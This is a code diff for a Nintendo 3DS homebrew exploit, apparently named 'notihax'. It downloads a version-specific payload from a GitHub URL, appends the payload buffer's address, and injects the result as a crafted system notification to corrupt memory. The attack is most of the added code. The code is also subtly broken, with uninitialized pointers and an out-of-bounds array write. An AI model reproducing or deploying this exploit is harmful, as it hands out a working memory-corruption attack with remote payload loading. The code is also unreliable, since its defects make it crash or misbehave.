@@ -1,13 +1,12 @@
 #include <3ds.h>
 
 // Code from examples/3ds/http/source/main.c
-Result http_download(httpcContext *context, u8* out)//This error handling needs updated with proper text printing once ctrulib itself supports that.
+Result http_download(httpcContext *context, u8* out, u8* bytes_downloaded)//This error handling needs updated with proper text printing once ctrulib itself supports that.
 {
 	Result ret=0;
 	u8* framebuf_top;
 	u32 statuscode=0;
 	u32 contentsize=0;
-	u8 *buf;
 
 	ret = httpcBeginRequest(context);
 	if(ret!=0)return ret;
@@ -22,19 +21,14 @@ Result http_download(httpcContext *context, u8* out)//This error handling needs 
 
 	gfxFlushBuffers();
 
-	buf = out;
-	if(buf==NULL)return -1;
-	memset(buf, 0, contentsize);
+	memset(out, 0, contentsize);
 
 
-	ret = httpcDownloadData(context, buf, contentsize, NULL);
+	ret = httpcDownloadData(context, out, contentsize, NULL);
 	if(ret!=0)
 	{
-		free(buf);
 		return ret;
 	}
-
-	free(buf);
 
 	return 0;
 }
@@ -130,7 +124,7 @@ int main(int argc, char** argv)
             if(hidKeysDown() & KEY_A) {
                 break;
             } else {
-                goto exit;
+                return 0;
             }
         }
     }
@@ -145,15 +139,50 @@ int main(int argc, char** argv)
     char* payload_loc;
     sprintf(payload_loc, "http://raw.githubusercontent.com/TechNick6425/notihax/master/payloads/%s%8x", (n3ds != 0 ? "n" : "o"), kver);
 
-    printf("Downloading payload...\n");
+    printf("\nDownloading payload...\n");
 
     httpcContext context;
     httpcOpenContext(&context, HTTPC_METHOD_GET, payload_loc, 1);
 
-    
+    u32 bytes;
+    u8* buffer;
 
-exit:
+    http_download(&context, buffer, &bytes);
+
+    printf("Building haxxed notification...\n");
+
+    u8 title_payload[bytes + 4];
+
+    for(int i = 0; i < bytes; i++)
+    {
+        title_payload[i] = buffer[i];
+    }
+
+    title_payload[bytes + 1] = (u8) ((((u32) buffer) >> 24) & 0xFF);
+    title_payload[bytes + 2] = (u8) ((((u32) buffer) >> 16) & 0xFF);
+    title_payload[bytes + 3] = (u8) ((((u32) buffer) >> 8 ) & 0xFF);
+    title_payload[bytes + 4] = (u8) ((((u32) buffer)      ) & 0xFF);
+
+    newsInit();
+
+    printf("Submitting haxxed notification...\n");
+
+    NEWS_AddNotification((u16*)&title_payload, bytes, (u16*)&title_payload, bytes, (u16*)&title_payload, bytes, false);
+
+    printf("Injected haxxed notification!\n");
+
+    while(aptMainLoop())
+    {
+        hidScanInput();
+
+        if(hidKeysDown())
+        {
+            break;
+        }
+    }
+
     aptExit();
     httpcExit();
 	gfxExit();
+    newsExit();
 }
